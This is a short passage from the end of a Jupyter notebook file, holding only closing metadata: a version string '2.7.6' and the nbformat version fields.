   "version": "2.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
